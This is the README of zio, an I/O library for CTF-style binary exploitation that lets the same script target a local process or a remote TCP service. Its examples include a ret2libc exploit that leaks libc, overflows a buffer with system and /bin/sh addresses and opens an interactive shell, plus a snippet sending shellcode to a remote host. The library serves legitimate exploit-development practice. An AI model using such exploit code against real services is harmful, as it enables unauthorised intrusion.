
# zio

[![Build Status](https://travis-ci.org/zTrix/zio.png)](https://travis-ci.org/zTrix/zio)

[zio] is an easy-to-use io library for pwning development, supporting an unified interface for local process pwning and TCP socket io.

The primary goal of [zio] is to provide unified io interface between process stdin/stdout and TCP socket io. So when you have done local pwning development, you only need to change the io target to pwn the remote server.

The following code illustrate the basic idea.

```python
from zio import *

if debug_local:
    io = zio('./buggy-server')            # used for local pwning development
else:
    io = zio(('1.2.3.4', 1337))           # used to exploit remote service

io.write(your_awesome_ropchain_or_shellcode)
# hey, we got an interactive shell!
io.interact()
```

## Advantage

 - Self contained single file installation, no extra dependency required. Copy it as you go and fire with no pain even without internet access.
 - Support both python2 and python3, no need worry about the python version installed on some unknown jump server provided by unknown.

## License

[zio] use [SATA License](LICENSE.txt) (Star And Thank Author License), so you have to star this project before using. Read the [license](LICENSE.txt) carefully.

## Working Environment

 - Linux or OSX
 - Python 2.6, 2.7, 3

## Installation

This is a single-file project so in most cases you can just download [zio.py](https://raw.githubusercontent.com/zTrix/zio/master/zio.py) and start using.

pip is also supported, so you can also install by running 

```bash
$ pip install zio
```

## Examples
 
```python
from zio import *
io = zio('./buggy-server')
# io = zio((pwn.server, 1337))

for i in range(1337):
    io.writeline('add ' + str(i))
    io.read_until('>>')

io.write(b"add TFpdp1gL4Qu4aVCHUF6AY5Gs7WKCoTYzPv49QSa\ninfo " + "A" * 49 + "\nshow\n")
io.read_until(b'A' * 49)
libc_base = l32(io.read(4)) - 0x1a9960
libc_system = libc_base + 0x3ea70
libc_binsh = libc_base + 0x15fcbf
payload = b'A' * 64 + l32(libc_system) + b'JJJJ' + l32(libc_binsh)
io.write(b'info ' + payload + b"\nshow\nexit\n")
io.read_until(b">>")
# We've got a shell;-)
io.interact()
```

## Document

To be added... Please wait...

### about line break and carriage return

Just don't read '\n' or '\r', use `read_line()` instead

### Play with cmdline

Act like netcat

```
$ printf 'GET / HTTP/1.0\r\n\r\n' | ./zio.py baidu.com 80
```

Unhex

```
$ echo '3334350a' | ./zio.py -d unhex -w none -r none -i pipe -o pipe --show-input=0 cat
345
```

hexcat some file

```
$ cat somefile | ./zio.py -e hex -w none -r none -i pipe -o pipe --show-input=0 cat
```

show file in string repr

```
$ cat somefile | ./zio.py -e repr -w none -r none -i pipe -o pipe --show-input=0 cat
```

## Thanks (Also references)

 - [pexpect](https://github.com/pexpect/pexpect) I borrowed a lot of code from here
 - [sh](https://github.com/amoffat/sh)
 - python subprocess module
 - TTY related
   - http://linux.die.net/man/3/cfmakeraw
   - http://marcocorvi.altervista.org/games/lkpe/tty/tty.htm
   - http://www.linusakesson.net/programming/tty/

[zio]:https://github.com/zTrix/zio
